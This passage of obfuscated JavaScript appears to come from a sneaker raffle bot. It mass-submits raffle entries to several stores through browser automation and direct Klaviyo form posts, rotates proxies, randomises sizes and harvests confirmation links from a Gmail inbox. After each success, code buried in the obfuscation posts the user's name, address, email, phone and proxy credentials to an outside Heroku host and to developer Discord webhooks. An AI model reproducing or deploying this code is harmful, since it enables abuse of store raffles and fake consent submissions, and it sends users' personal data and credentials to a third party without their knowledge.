                            }), await _0x19fafd['goto']('' + _0x4d6d39[_0x2f38ca]['Url'], { 'waitUntil': 'networkidle2' }), await _0x572e60(0x12c), await _0x19fafd['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x19fafd['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x572e60(0x7d0);
                            try {
                                await _0x19fafd['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x19fafd['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0xed09ee() + '\x20[' + _0x38a091['name'] + ']\x20Task\x20' + (_0x2f38ca + 0x1) + '\x20:\x20Logging\x20in'), await _0x19fafd['waitForSelector']('#username'), await _0x19fafd['type']('#username', _0x4d6d39[_0x2f38ca]['Email']), await _0x19fafd['waitForSelector']('#password'), await _0x19fafd['type']('#password', _0x4d6d39[_0x2f38ca]['Password']), await _0x572e60(0x190), await _0x19fafd['click']('#buttonSubmit'), await _0x19fafd['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0xed09ee() + '\x20[' + _0x38a091['name'] + ']\x20Task\x20' + (_0x2f38ca + 0x1) + '\x20:\x20Getting\x20Product'), await _0x572e60(0x1f4), console['log'](_0xed09ee() + '\x20[' + _0x38a091['name'] + ']\x20Task\x20' + (_0x2f38ca + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x4d6d39[_0x2f38ca]['Size']);
                            let _0x2c35b4 = _0x4d6d39[_0x2f38ca]['Size']['replace']('.5', '\x201/2');
                            if (_0x2c35b4['toUpperCase']() == 'RANDOM') {
                                const _0x24a425 = await _0x19fafd['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x457977 = Math['round'](Math['random']() * (_0x24a425['length'] - 0x1));
                                await _0x24a425[_0x457977]['click']();
                            } else
                                await _0x19fafd['click']('button[aria-label=\x22' + _0x2c35b4 + '\x22]');
                            await _0x572e60(0x1f4);
                            try {
                                await _0x19fafd['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x572e60(0x12c), console['log'](_0xed09ee() + '\x20[' + _0x38a091['name'] + ']\x20Task\x20' + (_0x2f38ca + 0x1) + '\x20:\x20Filling\x20Information'), await _0x19fafd['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x572e60(0x12c), await _0x19fafd['type']('#dwfrm_raffle_addressFields_firstName', _0x4d6d39[_0x2f38ca]['FirstName']), await _0x572e60(0x12c), await _0x19fafd['type']('#dwfrm_raffle_addressFields_lastName', _0x4d6d39[_0x2f38ca]['LastName']), await _0x572e60(0x12c), await _0x19fafd['select']('#dwfrm_raffle_addressFields_country', _0x4d6d39[_0x2f38ca]['Country']), await _0x572e60(0x12c), await _0x19fafd['type']('#dwfrm_raffle_addressFields_city', _0x4d6d39[_0x2f38ca]['City']), await _0x572e60(0x12c);
                            _0x4d6d39[_0x2f38ca]['Postcode'] == undefined && (_0x4d6d39[_0x2f38ca]['Postcode'] = _0x4d6d39[_0x2f38ca]['Zip']);
                            await _0x19fafd['type']('#dwfrm_raffle_addressFields_postalCode', _0x4d6d39[_0x2f38ca]['Postcode']), await _0x572e60(0x12c), await _0x19fafd['type']('#dwfrm_raffle_addressFields_address1', _0x4d6d39[_0x2f38ca]['Address1']), await _0x572e60(0x12c), await _0x19fafd['type']('#dwfrm_raffle_addressFields_address2', _0x4d6d39[_0x2f38ca]['HouseNumber']), await _0x572e60(0x12c), await _0x19fafd['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x4d6d39[_0x2f38ca]['Address2']), await _0x572e60(0x12c), await _0x19fafd['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x572e60(0x12c), await _0x19fafd['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x4d6d39[_0x2f38ca]['Follower']), await _0x572e60(0x1f4), await _0x19fafd['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x572e60(0x1f4), console['log'](_0xed09ee() + '\x20[' + _0x38a091['name'] + ']\x20Task\x20' + (_0x2f38ca + 0x1) + '\x20:\x20' + _0x2d77f8['blue']('Awaiting\x20Paypal\x20Payment')), await _0x19fafd['click']('.b-paypal_button');
                            try {
                                await _0x19fafd['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x5377b3 = 'no', _0x14aa55(_0x4d6d39[_0x2f38ca], _0x38a091), console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x38a091['name'] + ']\x20Task\x20' + (_0x2f38ca + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x12e008['succesDEVMSG']);
                                await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x12e008['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x30beeb, _0x12e008['succesPUBMSG']);
                                let _0x2d9438 = _0x4d6d39[_0x2f38ca];
                                try {
                                    prxdata = {
                                        'username': _0x447b4a['replace']('#', ''),
                                        'module': _0x38a091['name'],
                                        'entrydata': JSON['stringify'](_0x2d9438),
                                        'proxy': '' + _0x11c212[_0x2f38ca]
                                    };
                                    var _0x55bdcb = JSON['stringify'](prxdata);
                                    let _0x105b75 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x55bdcb, _0x105b75);
                                } catch (_0x4d3ab5) {
                                }
                            } catch (_0x1b42e3) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x38a091['name'] + ']\x20Task\x20' + (_0x2f38ca + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x1b42e3)), _0x48e19c = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x1b42e3;
                                var _0x361fcb = await _0x254487(_0x4d6d39[_0x2f38ca], _0x38a091, 'dev', !![], _0x48e19c);
                                _0x12e008['errorDEV'] = { 'embeds': [_0x361fcb] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x12e008['errorDEV']), await _0x5641c6(_0x188004, _0x12e008['errorDEV']);
                            }
                        } catch (_0x4747fa) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x38a091['name'] + ']\x20Task\x20' + (_0x2f38ca + 0x1) + '\x20:\x20' + _0x4747fa)), _0x48e19c = '' + _0x4747fa;
                            var _0x361fcb = await _0x254487(_0x4d6d39[_0x2f38ca], _0x38a091, 'dev', !![], _0x48e19c);
                            _0x12e008['errorDEV'] = { 'embeds': [_0x361fcb] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x12e008['errorDEV']), await _0x5641c6(_0x188004, _0x12e008['errorDEV']), _0x5377b3 = 'yes';
                        } finally {
                            _0x3c157d && _0x3c157d['close']();
                            if (_0x5377b3 == 'yes' && _0x4002af != 0x5) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x38a091['name'] + ']\x20Task\x20' + (_0x2f38ca + 0x1) + '\x20:\x20Retrying\x20(' + _0x4002af + '\x20/\x205)')), _0x2f38ca = _0x2f38ca - 0x1, _0x4002af = _0x4002af + 0x1;
                                continue;
                            }
                            _0x5377b3 == 'yes' && _0x4002af >= 0x5 && (_0x58f6f1(_0x4d6d39[_0x2f38ca], _0x38a091), _0x5377b3 = 'no', _0x4002af = 0x0), console['log']('Waiting\x20for\x20' + _0x114346['AfewDelay'] + '\x20ms'), await _0x572e60(_0x114346['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3eeb9d, _0x405453, _0x3a28ec) {
                    for (var _0x3ec436 = 0x0; _0x3ec436 < _0x405453['length']; _0x3ec436++) {
                        try {
                            await _0x44ca58(_0x405453, _0x3ec436);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x5f1d85(_0x19706a, _0x122ede, _0x516844, _0x406c43, _0x2e49ef) {
                            var _0x18c30a, _0x4d51a3 = {}, _0x479d96 = [], _0x151ed3 = {}, _0x412fc9 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x33875f = Math['round'](Math['random']() * (_0x412fc9['length'] - 0x1));
                            !_0x406c43 && (_0x406c43 = {});
                            if (_0x122ede != 'ver') {
                                _0x59687e(_0x516844['name'] + '\x20Task\x20' + (_0x19706a + 0x1) + '\x20/\x20' + _0x406c43['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f), await _0x44ca58(_0x406c43, _0x19706a), _0x4d51a3 = _0x516844['data'], _0x4d51a3['data']['attributes']['email'] = '' + _0x406c43[_0x19706a]['Email'];
                                if (_0x406c43[_0x19706a]['Size'] == 'RANDOM') {
                                }
                                _0x4d51a3['data']['attributes']['properties']['$first_name'] = '' + _0x406c43[_0x19706a]['FirstName'], _0x4d51a3['data']['attributes']['properties']['$last_name'] = '' + _0x406c43[_0x19706a]['LastName'], _0x4d51a3['data']['attributes']['properties']['$address1'] = _0x406c43[_0x19706a]['Address1'] + '\x20' + _0x406c43[_0x19706a]['Address2'] + '\x20' + _0x406c43[_0x19706a]['HouseNumber'], _0x4d51a3['data']['attributes']['properties']['$zip'] = '' + _0x406c43[_0x19706a]['Zip'], _0x4d51a3['data']['attributes']['properties']['$city'] = '' + _0x406c43[_0x19706a]['City'], _0x4d51a3['data']['attributes']['properties']['$country'] = '' + _0x406c43[_0x19706a]['Country'], _0x406c43[_0x19706a]['Size'] == 'RANDOM' ? _0x4d51a3['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x412fc9[_0x33875f] : _0x4d51a3['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x406c43[_0x19706a]['Size'], _0x4d51a3['data']['attributes']['properties']['$phone_number'] = '' + _0x406c43[_0x19706a]['Phone'], _0x4d51a3['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x406c43[_0x19706a]['Follower'];
                            }
                            if (_0x114346['useRandomProxy'] = ![])
                                var _0x4e1670 = _0x2e49ef[_0x19706a]['split'](':');
                            else
                                var _0x23f530 = Math['round'](Math['random']() * (_0x2e49ef['length'] - 0x1)), _0x4e1670 = _0x2e49ef[_0x23f530]['split'](':');
                            var _0x530fa5 = {
                                'jar': _0x388d4b,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x516844['url'],
                                'headers': _0x516844['headers'],
                                'body': JSON['stringify'](_0x4d51a3),
                                'proxy': 'http://' + _0x4e1670[0x2] + ':' + _0x4e1670[0x3] + '@' + _0x4e1670[0x0] + ':' + _0x4e1670[0x1]
                            };
                            return _0x122ede != 'ver' && (_0x530fa5['url'] = _0x516844['url'], _0x530fa5['headers'] = _0x516844['headers']), _0x122ede == 'ver' && (_0x530fa5['method'] = 'GET'), new Promise(function (_0x335de4, _0x3c0fcb) {
                                callback = async (_0x47ddb7, _0xbd47b1, _0x3280d1) => {
                                    if (!_0x47ddb7 && _0xbd47b1['statusCode'] == 0xca || !_0x47ddb7 && _0xbd47b1['statusCode'] == 0xc8) {
                                        if (_0x122ede != 'ver') {
                                            var _0x1caa7e = await _0x254487(_0x406c43[_0x19706a], _0x516844, 'dev', ![]), _0x4308d0 = await _0x254487(_0x406c43[_0x19706a], _0x516844, 'pub', ![]);
                                            const _0x331996 = {
                                                'succesDEVMSG': { 'embeds': [_0x1caa7e] },
                                                'succesPUBMSG': { 'embeds': [_0x4308d0] }
                                            };
                                            let _0x33c99b = _0x406c43[_0x19706a];
                                            try {
                                                prxdata = {
                                                    'username': _0x447b4a['replace']('#', ''),
                                                    'module': _0x516844['name'],
                                                    'entrydata': JSON['stringify'](_0x33c99b),
                                                    'proxy': '' + _0x2e49ef[_0x19706a]
                                                };
                                                var _0x1a9f85 = JSON['stringify'](prxdata);
                                                let _0x4a49cb = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x1a9f85, _0x4a49cb);
                                            } catch (_0x30ecb8) {
                                            }
                                            if (_0x114346['webhook'] != undefined && _0x114346['webhook'] != '')
                                                try {
                                                    await _0x5641c6(_0x114346['webhook'], _0x331996['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x331996['succesDEVMSG']), await _0x572e60(0xc8);
                                            try {
                                                await _0x5641c6(_0x30beeb, _0x331996['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x14aa55(_0x406c43[_0x19706a], _0x516844);
                                        }
                                        _0x335de4(console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x516844['name'] + ']\x20Task\x20' + (_0x19706a + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x122ede != 'ver') {
                                            var _0x259dc9 = '' + _0x47ddb7, _0x4c8afd = await _0x254487(_0x406c43[_0x19706a], _0x516844, 'dev', !![], _0x259dc9), _0x49d7c7 = {};
                                            _0x49d7c7['errorDEV'] = { 'embeds': [_0x4c8afd] }, _0x58f6f1(_0x406c43[_0x19706a], _0x516844), _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x49d7c7['errorDEV']), await _0x5641c6(_0x188004, _0x49d7c7['errorDEV']);
                                        }
                                        _0x3c0fcb(console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x516844['name'] + ']\x20Task\x20' + (_0x19706a + 0x1) + ':\x20' + _0x47ddb7)));
                                    }
                                };
                                try {
                                    _0x122ede != 'ver' && console['log'](_0xed09ee() + '\x20[' + _0x516844['name'] + ']\x20Task\x20' + (_0x19706a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4d51a3['data']['attributes']['email']), _0x2dca78(_0x530fa5, callback);
                                } catch (_0x56d146) {
                                    console['log'](_0xed09ee() + '\x20Task\x20' + (_0x19706a + 0x1) + ':\x20' + _0x56d146);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x5f1d85(_0x3ec436, 'nor', _0x3eeb9d, _0x405453, _0x3a28ec), console['log'](_0xed09ee() + '\x20[' + _0x3eeb9d['name'] + ']\x20Sleeping\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        } catch (_0x1f9e8d) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3d316e, _0x285b12, _0x282314) {
                    var _0x32324d = [], _0x105f46 = ![];
                    async function _0x14d499() {
                        var _0x3b8ab1 = new _0x266969({
                            'user': _0x114346['masterMail'],
                            'password': _0x114346['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x877ec3(_0x35f1ba) {
                            _0x3b8ab1['openBox']('INBOX', ![], _0x35f1ba);
                        }
                        _0x3b8ab1['once']('ready', function () {
                            _0x877ec3(function (_0x50bfe3, _0x309062) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x50bfe3)
                                    throw _0x50bfe3;
                                _0x3b8ab1['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0xb23ad2, _0xd85f7b) {
                                    if (!_0xd85f7b || !_0xd85f7b['length'])
                                        console['log'](_0xed09ee() + '\x20[' + _0x3d316e['name'] + ']\x20No\x20mails\x20found'), _0x3b8ab1['end']();
                                    else {
                                        var _0x3b6be7 = _0x3b8ab1['seq']['fetch'](_0xd85f7b, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3b6be7['on']('message', function (_0x5cb418, _0x8f6bc4) {
                                            var _0x2f82d2 = '(#' + _0x8f6bc4 + ')\x20';
                                            _0x5cb418['on']('body', function (_0x96fc61, _0x5b2dcc) {
                                                _0x172805(_0x96fc61, (_0xda5270, _0xa962f6) => {
                                                    var _0x38af72 = _0xa962f6['text']['split']('(')[0x1], _0x11748e = _0x38af72['split'](')')[0x0];
                                                    _0x32324d['push'](_0x11748e);
                                                });
                                            }), _0x5cb418['once']('end', function () {
                                            });
                                        }), _0x3b6be7['once']('error', function (_0x3b9ab6) {
                                            console['log']('Fetch\x20error:\x20' + _0x3b9ab6), _0x105f46 = !![];
                                        }), _0x3b6be7['once']('end', function () {
                                            _0x3b8ab1['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3b8ab1['once']('error', function (_0x56b4fc) {
                            console['log'](_0x2d77f8['red'](_0x56b4fc['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x105f46 = !![];
                        }), _0x3b8ab1['once']('end', async function () {
                            _0x105f46 = !![];
                        }), _0x3b8ab1['connect']();
                    }
                    async function _0x38a963(_0x175d70, _0x3ac853, _0x43a6c8) {
                        for (var _0x1e743a = 0x0; _0x1e743a < _0x3ac853['length']; _0x1e743a++) {
                            async function _0x1540b5(_0x3b478c, _0xb9ec2c, _0x1bb464, _0x41aafb, _0x5a427d) {
                                var _0x401423, _0x55689e = {}, _0x9bcc57 = [], _0x125b58 = {}, _0x12c41c = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x291c26 = Math['round'](Math['random']() * (_0x12c41c['length'] - 0x1));
                                _0x41aafb[_0x3b478c]['Size'] == 'RANDOM' && (_0x41aafb[_0x3b478c]['Size'] = _0x12c41c[_0x291c26]);
                                !_0x41aafb && (_0x41aafb = {});
                                if (_0x114346['useRandomProxy'] = ![])
                                    var _0x207bef = _0x5a427d[_0x3b478c]['split'](':');
                                else
                                    var _0x1a2951 = Math['round'](Math['random']() * (_0x5a427d['length'] - 0x1)), _0x207bef = _0x5a427d[_0x1a2951]['split'](':');
                                var _0x3d41cf = {
                                    'jar': _0x388d4b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1bb464['url'],
                                    'headers': _0x1bb464['headers'],
                                    'body': JSON['stringify'](_0x55689e),
                                    'proxy': 'http://' + _0x207bef[0x2] + ':' + _0x207bef[0x3] + '@' + _0x207bef[0x0] + ':' + _0x207bef[0x1]
                                };
                                return _0xb9ec2c != 'ver' && (_0x3d41cf['url'] = _0x1bb464['url'], _0x3d41cf['headers'] = _0x1bb464['headers']), _0xb9ec2c == 'ver' && (_0x3d41cf['method'] = 'GET', _0x3d41cf['url'] = _0x41aafb[_0x3b478c]), new Promise(function (_0x5c24fa, _0x5a4a58) {
                                    callback = async (_0x457b4f, _0x2e61e1, _0x1c6cec) => {
                                        if (!_0x457b4f && _0x2e61e1['statusCode'] == 0xca || !_0x457b4f && _0x2e61e1['statusCode'] == 0xc8) {
                                            if (_0xb9ec2c != 'ver') {
                                                var _0x4b5e75 = await _0x254487(_0x41aafb[_0x3b478c], _0x1bb464, 'dev', ![]), _0x10accf = await _0x254487(_0x41aafb[_0x3b478c], _0x1bb464, 'pub', ![]);
                                                const _0x111773 = {
                                                    'succesDEVMSG': { 'embeds': [_0x4b5e75] },
                                                    'succesPUBMSG': { 'embeds': [_0x10accf] }
                                                };
                                                if (_0x114346['webhook'] != undefined && _0x114346['webhook'] != '')
                                                    try {
                                                        await _0x5641c6(_0x114346['webhook'], _0x111773['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x111773['succesDEVMSG']), await _0x572e60(0xc8);
                                                try {
                                                    await _0x5641c6(_0x30beeb, _0x111773['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x14aa55(_0x41aafb[_0x3b478c], _0x1bb464);
                                            }
                                            _0x5c24fa(console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x1bb464['name'] + ']\x20Task\x20' + (_0x3b478c + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0xb9ec2c != 'ver') {
                                                var _0x394643 = '' + _0x457b4f, _0x477470 = await _0x254487(_0x41aafb[_0x3b478c], _0x1bb464, 'dev', !![], _0x394643), _0x53b6bf = {};
                                                _0x53b6bf['errorDEV'] = { 'embeds': [_0x477470] }, _0x58f6f1(_0x41aafb[_0x3b478c], _0x1bb464), _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x53b6bf['errorDEV']), await _0x5641c6(_0x188004, _0x53b6bf['errorDEV']);
                                            }
                                            _0x5a4a58(console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x1bb464['name'] + ']\x20Task\x20' + (_0x3b478c + 0x1) + ':\x20' + _0x457b4f)));
                                        }
                                    };
                                    try {
                                        _0xb9ec2c != 'ver' ? console['log'](_0xed09ee() + '\x20[' + _0x1bb464['name'] + ']\x20Task\x20' + (_0x3b478c + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x55689e['data']['attributes']['email']) : console['log'](_0xed09ee() + '\x20[' + _0x1bb464['name'] + ']\x20Task\x20' + (_0x3b478c + 0x1) + ':\x20Fetching\x20Response'), _0x2dca78(_0x3d41cf, callback);
                                    } catch (_0x641365) {
                                        console['log'](_0xed09ee() + '\x20Task\x20' + (_0x3b478c + 0x1) + ':\x20' + _0x641365);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1540b5(_0x1e743a, 'ver', _0x175d70, _0x3ac853, _0x43a6c8), console['log'](_0xed09ee() + '\x20[' + _0x175d70['name'] + ']\x20Sleeping\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                            } catch (_0x54d7a5) {
                            }
                        }
                    }
                    try {
                        _0x14d499();
                        while (!_0x105f46) {
                            await _0x572e60(0xbb8);
                        }
                        console['log']('Found\x20' + _0x32324d['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x572e60(0x9c4);
                    }
                    await _0x38a963(_0x3d316e, _0x32324d, _0x282314);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RVHsXu',
                            'custom_source': 'DH6927-017',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'ScxJcu',
                                '$consent_form_version': 0x8c005b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x14d2de, _0x27d12e, _0x82abf) {
                    var _0x4080f3 = _0x27d12e, _0x346fdd = 0x0;
                    for (var _0x5df7af = 0x0; _0x5df7af < _0x27d12e['length']; _0x5df7af++) {
                        maxTasks = _0x114346['threads'];
                        while (_0x346fdd >= maxTasks) {
                            await _0x572e60(_0x114346['delay']);
                        }
                        async function _0x5bedbf(_0x2ef3b4, _0x5b6c1a, _0x35bb6a, _0x534deb) {
                            try {
                                await _0x44ca58(_0x5b6c1a, _0x534deb);
                            } catch (_0x52441a) {
                                throw new Error(_0x52441a);
                            }
                            async function _0x19dc6f(_0x2d8f51, _0x40631f, _0x43138a, _0x12c8cd, _0x20dae7) {
                                _0x346fdd++;
                                var _0x563b61, _0x5735db = {}, _0x1b38ab = [], _0x4a206a = {}, _0x38515f = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x5ecf1a = Math['round'](Math['random']() * (_0x38515f['length'] - 0x1));
                                !_0x12c8cd && (_0x12c8cd = {});
                                if (_0x40631f != 'ver') {
                                    _0x59687e(_0x43138a['name'] + '\x20Task\x20' + (_0x2d8f51 + 0x1) + '\x20/\x20' + _0x12c8cd['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f), _0x1b38ab = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x447b4a
                                            },
                                            {
